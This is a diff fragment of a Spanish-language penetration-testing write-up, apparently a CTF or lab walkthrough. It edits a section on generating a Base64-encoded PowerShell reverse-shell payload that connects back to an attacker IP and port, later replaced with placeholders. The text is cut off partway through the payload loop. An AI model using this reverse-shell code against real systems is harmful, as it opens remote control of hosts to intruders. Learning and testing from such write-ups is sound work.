@@ -173,10 +173,10 @@ Idea de explotación: escribir un script en el directorio de scripts de inicio d
 
 ### 7.1 Generar payload PowerShell
 
-Se genera un payload de reverse shell en PowerShell codificado en Base64 UTF-16LE:
+En Linux se genera un payload de reverse shell en PowerShell codificado en Base64 UTF-16LE (<BASE64_PAYLOAD>):
 
 ```bash
-echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.16.6",9001);
+echo '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<port>);
 $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
 $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
